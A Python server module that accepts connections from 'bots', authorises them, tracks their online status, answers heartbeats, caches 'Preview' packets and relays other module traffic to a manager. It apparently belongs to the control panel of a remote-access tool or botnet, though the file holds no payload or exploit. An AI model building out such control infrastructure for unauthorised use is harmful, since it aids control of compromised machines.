# backend\Core\ClientConnection.py
import asyncio, socket, json, logs.LoggerWrapper as logger
from backend.Services.Auth import authorize_client, sync_bot_data
from backend.Services import client as active_clients
from backend.BenchUtils import add_bytes
from backend.API.protocols import pack_bot_command

preview_cache = {}

class BotConnectionHandler:
    async def handle_new_connection(self, reader, writer):
        client_id, peer = None, writer.get_extra_info("peername")[0]
        if (sock := writer.get_extra_info('socket')): sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            if not (auth := await authorize_client(reader, peer)): return await self._force_close(writer)
            client_id, bot_data = auth
            await self._register_bot(client_id, bot_data, writer, reader)
            while (packet := await self._read_packet(reader)): await self._process_packet(client_id, writer, packet)
        except Exception as error: 
            if not isinstance(error, (asyncio.IncompleteReadError, ConnectionResetError)): 
                logger.Log.error(f"Handler Error [{client_id}]: {error}")
        finally: await self._disconnect_bot(client_id, writer)

    async def _register_bot(self, client_id, data, writer, reader):
        from backend.API import manager
        # Если бот уже был, просто тихо заменяем соединение без лишних алертов
        active_clients[client_id], data['status'] = (reader, writer), 'online'
        manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([data])))
        if client_id in preview_cache: manager.broadcast_packet_sync(preview_cache[client_id])
        logger.Log.info(f"[+] Бот {client_id} активен")

    async def _process_packet(self, client_id, writer, packet):
        from backend.API import manager
        try:
            id_len, mod_len = packet[0], packet[1]
            module = packet[6+id_len : 6+id_len+mod_len].decode(errors='ignore')
            add_bytes(len(packet))
            if module == "Heartbeat": writer.write(pack_bot_command(client_id, "Heartbeat", "pong")); await writer.drain()
            elif module == "DataScribe":
                full_data = sync_bot_data(client_id, json.loads(packet[6+id_len+mod_len:].decode()))
                full_data['status'] = 'online'
                manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([full_data])))
            elif module == "Preview": (preview_cache.__setitem__(client_id, packet), manager.broadcast_packet_sync(packet))
            else: manager.broadcast_packet_sync(packet)
        except Exception as error: logger.Log.error(f"Pkt Err [{client_id}]: {error}")

    async def _disconnect_bot(self, client_id, writer):
        from backend.API import manager
        # КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Удаляем только если в словаре именно Тот сокет, который закрылся
        if client_id in active_clients and active_clients[client_id][1] == writer:
            active_clients.pop(client_id)
            manager.broadcast_packet_sync(pack_bot_command(client_id, "DataScribe", json.dumps([{"id": client_id, "status": "offline"}])))
            logger.Log.warning(f"[-] Бот {client_id} реально отключился")
        await self._force_close(writer)

    async def _read_packet(self, reader):
        try:
            header = await reader.readexactly(6)
            return header + await reader.readexactly(header[0] + header[1] + int.from_bytes(header[2:6], "big"))
        except: return None

    async def _force_close(self, writer):
        if not writer.is_closing(): 
            writer.close()
            try: await asyncio.wait_for(writer.wait_closed(), 1)
            except: pass